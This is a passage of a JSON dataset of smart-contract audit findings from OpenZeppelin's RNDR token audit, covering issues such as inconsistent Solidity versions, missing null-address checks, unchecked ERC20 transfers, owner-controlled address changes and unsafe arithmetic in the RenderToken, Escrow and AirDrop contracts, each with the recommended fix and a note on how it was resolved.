      "content": "There is a significant coding-style difference between the contracts in the [`Token-Audit`](https://github.com/jeualvarez/Token-Audit) repository and those in [`Token-Airdrop`](https://github.com/jeualvarez/Token-Airdrop/tree/d96202acf6fb5d0305368bac36aa960d455cbffe) repository. The contracts in the first one use docstrings, libraries like [OpenZeppelinâ€™s](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/math/SafeMath.sol)  [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/math/SafeMath.sol) , and 2-space indentation. The latter, on the other hand, has no comments in the source code nor takes security considerations into account by using already audited libraries, and uses 4-space indentation. Consider following best practices and applying the same style guidelines across all files.\n\n\n***Update:** both repositories use now a consistent coding style.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11896",
      "title": "Inconsistent use of imports in contracts",
      "impact": "LOW",
      "content": "The use of imports in contracts is not consistent throughout the codebase. There are missing explicit imports (*e.g.* missing imports for `Migratable` and `Ownable` in `Escrow.sol`, and for `MintableToken` in `RenderToken.sol`). Consider explicitly importing all necessary contracts in each contract throughout the codebase to improve code consistency and legibility.\n\n\n***Update:** all imports use now a consistent style.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11895",
      "title": "Erroneous documentation in initialize functions",
      "impact": "LOW",
      "content": "Initialize functions (in [`Escrow`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L31) and [`RenderToken`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L26) ) are incorrectly documented, since these functions are not contract constructors. Consider updating the inline documentation to fix these errors.\n\n\n***Update:** documentation now refers to the functions as initializers instead of constructors.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11894",
      "title": "Broken testing instructions in READMEÂ files",
      "impact": "LOW",
      "content": "Instructions in [`Token-Audit/README.md`](https://github.com/jeualvarez/Token-Audit/blob/master/README.md) file do not work if followed literally. An error â€œ*Cannot findÂ ./config module*â€ is thrown while running `npm test`. Instructions in [`Token-Airdrop/README.md`](https://github.com/jeualvarez/Token-Airdrop/blob/master/README.md) file also do not work, with the error â€œ*Could not find artifacts for Airdrop from any sources*â€ thrown while running `truffle test`. These errors might arise from differences in casing: the name of the contract in the `Airdrop.sol` file is `AirDrop`, but the artifact being required is `Airdrop`. This in turn might be due to the fact that in OS X, strings are case-insensitive. While this works on Macâ€™s filesystems, it can lead to setup errors when working across different operating systems.\n\n\nConsider updating the instructions and including a working cross-platform configuration so developers and auditors can successfully run the test suite. Furthermore, given that the test suite for the `Airdrop` contract can only be run using the`truffle v5.0.0-beta` release, consider including this version of truffle as a dev dependency in the `package.json` file of the project.\n\n\n***Update:** the `README` files were updated with new testing instructions.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11893",
      "title": "Untested functions in RenderToken",
      "impact": "LOW",
      "content": "The `RenderToken` contract implements functions (*e.g.* [holdInEscrow](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L39) ) that are not being tested in the test suite. Consider testing all functions implemented in contracts to ensure they behave as expected.\n\n\n***Update:** some testing of `holdInEscrow` was done in the `Escrow.js` file, but an additional test for this function was [added](https://github.com/jeualvarez/Token-Audit/blob/master/test/RenderToken.js#L160) to the `RenderToken.js` file.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11892",
      "title": "Missing docstrings in contract and functions in AirdropÂ contract",
      "impact": "LOW",
      "content": "The`AirDrop` contractâ€™s source code, which handles token distribution, has no inline documentation whatsoever. Consider documenting with *docstrings* everything that is part of the public API.\n\n\n***Update:** the `AirDrop` contract is now thoroughly documented.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11891",
      "title": "Missing error messages in require statements",
      "impact": "LOW",
      "content": "There are several require statements (such as [`Escrow`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L70) [:L70](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L70) , [`Escrow`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L89) [:L89](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L89) , [`Escrow`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L109) [:L109](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L109) , [`RenderToken`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L40) [:L40](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L40) , [`RenderToken`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L45) [:L45](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L45) ) that provide no error messages. Consider including specific and informative error messages in all require statements.\n\n\n***Update:** all `require` statements now provide appropriate error messages.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11890",
      "title": "Deceptive inline comment in EscrowÂ contract",
      "impact": "LOW",
      "content": "Considering the issue â€œ*The Escrowâ€™s owner can arbitrarily increase the balance of any job without spending RNDR tokens*â€ above, the comment in [`Escrow.sol`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L88) that states: â€œ*Jobs can only be created through the RNDR contract*â€ is false and may be misleading for users reading the contractâ€™s code. Consider rephrasing it clearly to state that job balances can be arbitrarily incremented by whatever account the owner of the contract sets as the [`renderTokenAddress`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L19).\n\n\n***Update:** the comment was fixed to read: â€œ[*Jobs can only be created by the address stored in the renderTokenAddress variable*](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L117) â€*.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11889",
      "title": "Event parameters are notÂ indexed",
      "impact": "LOW",
      "content": "The [`AddedUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L16) and [`PaidUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L17) events defined in `Airdrop` as well as the [`JobBalanceUpdate`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L24) event defined in `Escrow` are not indexing their parameters. This means that they will not be searchable in terms of those variables, making it impossible to track job balance histories, user additions or payments.\n\n\nIn case these are to be tracked, consider adding the `indexed` keyword to at least the `userAddress` variables in the `AddedUser` and `PaidUser` events, and the `_jobId` variable in the `JobBalanceUpdate` event.\n\n\n***Update:** the [`AddUser`](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L27) and [`PaidUser`](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L28) events now index their parameters, but the [`JobBalanceUpdate`](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L30) one still doesnâ€™t. String indexing had an associated [web3(<https://github.com/ethereum/web3.js/issues/434#issuecomment-321526814>) [issue](https://ethereum.stackexchange.com/questions/6840/indexed-event-with-string-not-getting-logged/7170#7170) , which is purportedly [solved](https://github.com/ethereum/web3.js/issues/434#issuecomment-371999998) in version 1.0. Alternatively, two workarounds for this issue are discussed [here](https://github.com/OpenZeppelin/openzeppelin-solidity/issues/992).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11888",
      "title": "Storage modification on eventÂ emission",
      "impact": "MEDIUM",
      "content": "In the [`addUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L27) function of the `Airdrop` contract, an item is pushed into the `bonusAddresses` array. The result of the operation, which is the length for that array after the addition, is used as a parameter in the [`AddedUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L31) event emission. This, while valid Solidity, is confusing and error-prone.\n\n\nConsider performing the storage modification and keeping the resulting value in a temporary variable before emitting the event for code clarity.\n\n\n***Update:** the temporary value is now [assigned to a variable](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L53) before emitting the event.*",
      "summary": "\nThis bug report is about the `addUser` function of the `Airdrop` contract. The issue is that when an item is pushed into the `bonusAddresses` array, the result of the operation is used as a parameter in the `AddedUser` event emission. This could be confusing and error-prone. The solution proposed is to perform the storage modification and keep the resulting value in a temporary variable before emitting the event for clarity. This has been implemented and the temporary value is now assigned to a variable before emitting the event.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11887",
      "title": "Missing checks for null addresses in RenderToken and Airdrop contracts",
      "impact": "MEDIUM",
      "content": "In `RenderToken`, the [`setEscrowContractAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L58) function allows the tokenâ€™s owner to change the escrowâ€™s address (*i.e.* the contract variable [`escrowContractAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L20) ). However, the function does not implement a check to prevent the null address from being set.\n\n\nSimilarly in `Airdrop`, the contractâ€™s constructor receives as a parameter an address that is assigned to the contract variable [`renderTokenAddress`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L19) with no checks preventing the null address from being used.\n\n\nConsider implementing no-null address validations before setting these variables to avoid potential problems downstream.\n\n\n***Update:** null checks are now [in(<https://github.com/jeualvarez/Token-Audit/blob/master/contracts/RenderToken.sol#L88>) [place](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L36) for address changes.*",
      "summary": "\nThis bug report concerns two contracts, RenderToken and Airdrop, and the issue of null addresses. The RenderToken contract has a function, setEscrowContractAddress, which allows the tokenâ€™s owner to change the escrowâ€™s address. However, the function does not have a check to prevent the null address from being set. The Airdrop contract also has a constructor which receives an address that is assigned to the contract variable without any checks to prevent the null address from being used. It is recommended to implement no-null address validations before setting these variables to avoid potential problems downstream. The issue has now been resolved, with null checks in place for both contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11886",
      "title": "Unchecked ERC20 transfer operation",
      "impact": "MEDIUM",
      "content": "Inside the [`payUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L34) function, a transfer is being made but there are no checks validating its successful completion. If the transfer somehow fails, an event logging the successful operation would be emitted despite the transferee not getting their tokens.\n\n\nConsider using [OpenZeppelinâ€™s](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/token/ERC20/SafeERC20.sol)  [`SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/token/ERC20/SafeERC20.sol) library and its [`safeTransfer`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/0e65947efbffc592cffea8c2ae9d3b8e11659854/contracts/token/ERC20/SafeERC20.sol#L14) `function`, or surrounding the transfer operation with a require statement.\n\n\n***Update:** the `SafeERC20` library is [now used](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L68).*",
      "summary": "\nThis bug report is about the [`payUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L34) function in the Token-Airdrop repository. This function makes a transfer of tokens, however, it does not have checks in place to validate that the transfer was successful. This means that if the transfer fails, an event logging the successful operation would be emitted despite the transferee not receiving the tokens.\n\nTo fix this issue, the author suggests using the [`SafeERC20`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.12.0/contracts/token/ERC20/SafeERC20.sol) library and its [`safeTransfer`](https://github.com/OpenZeppelin/openzeppelin-solidity/blob/0e65947efbffc592cffea8c2ae9d3b8e11659854/contracts/token/ERC20/SafeERC20.sol#L14) `function`, or surrounding the transfer operation with a require statement. This would ensure that the transfer is successful and that the event is only logged if the transfer is successful. \n\nThe author has since updated the report to confirm that the `SafeERC20` library is now used in the [`AirDrop.sol`](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L68) file.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11885",
      "title": "payUser fails silently if the bonus was alreadyÂ paid",
      "impact": "MEDIUM",
      "content": "In the [`payUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L34) function of the `AirDrop` contract, an [`if`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L37) clause is used to check whether a bonus has already been paid. In the case the condition `amount &gt; 0` is not satisfied, the payment will not be performed, giving the caller no notice that it didnâ€™t go through apart from the lack of an associated event.\n\n\nConsider complementing the `if` with an `else` clause that handles the logic when the condition fails.\n\n\n***Update:** an event is now [emitted](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L71) in case the `if` condition fails.*",
      "summary": "\nThis bug report is about the `payUser` function of the `AirDrop` contract. The bug is that an `if` clause is used to check whether a bonus has already been paid, but in the case the condition `amount > 0` is not satisfied, the payment will not be performed, without giving any notice to the caller. The suggested solution is to complement the `if` with an `else` clause that handles the logic when the condition fails. This has been fixed by emitting an event when the `if` condition fails.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11884",
      "title": "Omission of the transfer in disburseJob leads to inconsistent balanceÂ state",
      "impact": "MEDIUM",
      "content": "The [`RenderToken`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol) contract interacts with the `Escrow` contract by funding jobs, transferring tokens to increase the different jobsâ€™ balances, which are tracked by the `Escrow`. The [`disburseJob`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L69) function later takes care of redistributing these funds among the `recipients`.\n\n\nThis function, however, does not actually transfer the tokens to the recipients, but simply sets an allowance, which the recipients can then use to transfer the tokens themselves. While there is merit in using a pattern where the beneficiaries are in charge of withdrawing their funds, the `disburseJob`function will leave the `Escrow` in an inconsistent state where the sum of the total [`jobBalances`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L69) is different from its total token balance, since the former are depleted by the function but the latter isnâ€™t.\n\n\nEven if the `jobBalances` mapping cannot be traversed to get the total balance without an external listing of jobs, consider implementing the `Escrow`balance tracking in a way that doesnâ€™t lead to inconsistencies, or using the `PullPayment/Escrow` solution provided in the OpenZeppelin suite.\n\n\n***Update:** the `disburseJob` function [now performs](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L103) the token transfers.*",
      "summary": "\nThis bug report is about the RenderToken contract interacting with the Escrow contract. The disburseJob function in the Escrow contract does not transfer tokens to the recipients, but sets an allowance for them to transfer the tokens themselves. This leaves the Escrow in an inconsistent state, where the total jobBalances and total token balance are different. It is suggested that the Escrow balance tracking be implemented in a way that does not lead to inconsistencies, or using the PullPayment/Escrow solution provided in the OpenZeppelin suite. This issue has been resolved, as the disburseJob function now performs the token transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11883",
      "title": "Input arrays with mismatched length will make addManyUsers throw",
      "impact": "MEDIUM",
      "content": "The [`addManyUsers`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L45) function in the `AirDrop` contract, in charge of registering the `_recipients` of the airdrop and their respective bonus `_amounts`, simultaneously iterates over both arrays based on the length of just one of them (`_recipients`). If the number of elements in `_amounts` is less than that in `_recipients`, the whole transaction will be reverted for attempting to access an out-of-bounds index.\n\n\nConsider including a require clause with an explicit error message to check for matching array length.\n\n\n***Update:** a [`require`](https://github.com/jeualvarez/Token-Airdrop/blob/master/contracts/AirDrop.sol#L110) statement now checks for matching array length.*",
      "summary": "\nThis bug report is about the `addManyUsers` function in the `AirDrop` contract. The function is in charge of registering the `_recipients` of the airdrop and their respective bonus `_amounts`. The bug is that the function simultaneously iterates over both arrays based on the length of just one of them (`_recipients`). This means that if the number of elements in `_amounts` is less than that in `_recipients`, the whole transaction will be reverted for attempting to access an out-of-bounds index.\n\nTo fix this bug, the report suggests including a `require` clause with an explicit error message to check for matching array length. This has now been done, and the `require` statement now checks for matching array length.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11882",
      "title": "Two different minting functions coexist in the RenderToken contract",
      "impact": "MEDIUM",
      "content": "As per the disclaimer in the header, we havenâ€™t been able to assess the migration strategy for not having been provided with the code corresponding to the legacy contract to be migrated. Instead, the [`LegacyToken.sol`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/LegacyToken.sol) and [`MigratableERC20.sol`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/MigratableERC20.sol) files were extracted from an [example provided as a guide](https://docs.zeppelinos.org/docs/erc20_onboarding.html) in an early version of ZeppelinOS. This guide explains how to migrate old token balances by burning old and minting new tokens, for which it introduced aÂ [`_mint`](https://github.com/zeppelinos/erc20-opt-in-onboarding/blob/master/contracts/MyUpgradeableToken.sol#L29) function in the new token, which extended `StandardToken` from [`openzeppelin-zos`](https://github.com/OpenZeppelin/openzeppelin-eth) (now renamed to `openzeppelin-eth`).\n\n\nApart from the two copied files that function as placeholder, the [`RenderToken`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol) `contract` implements the [`_mint`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L44) function that is declared in `MigratableERC20`, from which it extends. However, `RenderToken` also extends from `openzeppelin-zos`â€˜s [`MintableToken`](https://github.com/OpenZeppelin/openzeppelin-eth/blob/v1.9.4/contracts/token/ERC20/MintableToken.sol) , which already has a minting function named [`mint`](https://github.com/OpenZeppelin/openzeppelin-eth/blob/v1.9.4/contracts/token/ERC20/MintableToken.sol#L36). Duplicating the minting functionality is confusing and potentially dangerous. Whichever form the migration ends up taking, consider using the already existing `mint` function for it.\n\n\n***Update:** The `RenderToken` contract now extends from `openzeppelin-eth's`[`StandardToken`](https://github.com/OpenZeppelin/openzeppelin-eth/blob/v1.9.4/contracts/token/ERC20/StandardToken.sol) instead of `MintableToken`, and there is now a single minting function called [`_mintMigratedTokens`](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/RenderToken.sol#L66).*",
      "summary": "\nThis bug report is about the migration strategy of a legacy contract to a new token. The code for the legacy contract was not provided, so two files, `LegacyToken.sol` and `MigratableERC20.sol`, were extracted from an example guide. The `RenderToken` contract was then implemented to extend from `MigratableERC20`, which introduced a `_mint` function. However, the `RenderToken` contract also extended from `MintableToken`, which already has a minting function named `mint`. This duplication of minting functionality is confusing and potentially dangerous. The bug report has been updated to show that `RenderToken` now extends from `StandardToken` instead of `MintableToken`, and there is now a single minting function called `_mintMigratedTokens`. To avoid confusion and potential danger, the existing `mint` function should be used for the migration.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11881",
      "title": "Inconsistent and experimental use of SolidityÂ versions",
      "impact": "HIGH",
      "content": "Across the audited contracts, several versions of the Solidity compiler are used: `^0.4.18` in `Escrow`, `^0.4.14` in `RenderToken`, `^0.4.21` in the migration example contracts `LegacyToken` and `MigratableERC20`, and `^0.4.0`in `Airdrop`, which also uses the pragma`#experimental â€œv0.5.0â€`.\n\n\nWhile the individual contracts can be compiled using different versions of the Solidity compiler, profuse versioning among the same codebase is confusing and error-prone. As indicated by its name, the `experimental` feature should not be used in production.\n\n\nConsider using the latest ([`0.4.25`](https://github.com/ethereum/solidity/releases/tag/v0.4.25) at the time of writing) version of the Solidity compiler throughout the code.\n\n\n***Update:** Solidity version `v0.4.24` is now used throughout the project.*",
      "summary": "\nThis bug report is about the Solidity compiler used across the audited contracts. The versions of the Solidity compiler used were `^0.4.18` in `Escrow`, `^0.4.14` in `RenderToken`, `^0.4.21` in the migration example contracts `LegacyToken` and `MigratableERC20`, and `^0.4.0`in `Airdrop`, which also uses the pragma`#experimental â€œv0.5.0â€`. Using different versions of the Solidity compiler in the same codebase is confusing and error-prone. It is recommended to use the latest version of the Solidity compiler across the codebase. The latest version at the time of writing was `0.4.25`. The bug report has been updated to include that Solidity version `v0.4.24` is now used throughout the project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11880",
      "title": "Contract owners can change business logic unnoticeably",
      "impact": "HIGH",
      "content": "In several contracts, the owner can arbitrarily change the business logic by setting new contract addresses, without properly warning users of those changes. Examples are:\n\n\n* [`RenderToken#setEscrowContractAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/RenderToken.sol#L58) :the address that will hold tokens in escrow and keep a ledger of funds available for jobs.\n* [`Escrow#changeRenderTokenAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L55) : the address of the token contract.\n* [`Escrow#changeDisbursalAddress`](https://github.com/jeualvarez/Token-Audit/blob/e946177747e57312690775204834b8fca1bbb0d5/contracts/Escrow.sol#L45) : the address authorized to distribute tokens for completed jobs.\n\n\nConsider emitting events to notify users about any modifications of such importance in the contractsâ€™ business logic.\n\n\n***Update:** events [are](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/RenderToken.sol#L91) [now](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L84) [emitted](https://github.com/jeualvarez/Token-Audit/blob/master/contracts/Escrow.sol#L66) to provide users with a mechanism to track these changes.*",
      "summary": "\nThis bug report is about contracts that allow the owner to arbitrarily change the business logic by setting new contract addresses without properly warning users. Examples of this are the 'RenderToken#setEscrowContractAddress', 'Escrow#changeRenderTokenAddress', and 'Escrow#changeDisbursalAddress' contracts. It is recommended that events are emitted to notify users of any changes to the contracts' business logic. This update has been made and events are now emitted to provide users with a mechanism to track these changes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "RNDR Token TransferÂ Audit",
      "source_link": "https://blog.openzeppelin.com/rndr-token-transfer-audit-74b21356b849/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11879",
      "title": "Unsafe arithmetic operations in AirdropÂ contract",
      "impact": "HIGH",
      "content": "The `Airdrop` contract contains a series of arithmetic operations which are not being addressed with caution (in lines [30](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L30) , [39](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L39) , [56](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L56) , [58](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L58) , [64](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L64) and [65](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L65) ) , leading to attempts to store numbers outside the range of the data types of their target variables. There are in particular two situations which could potentially cause integer overflows/underflows.\n\n\nThe first case is related to an assignment to a storage variable inside a loop in the [`addManyUsers`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L45) function. This function iterates through a `_recipients`array of `addresses` and a paired `_amounts` array of `uint256`â€˜s. In each iteration, the function [`addUser`](https://github.com/jeualvarez/Token-Airdrop/blob/d96202acf6fb5d0305368bac36aa960d455cbffe/contracts/Airdrop.sol#L27) is called, which adds the respective user amount to the storage variable `totalBonus`, in 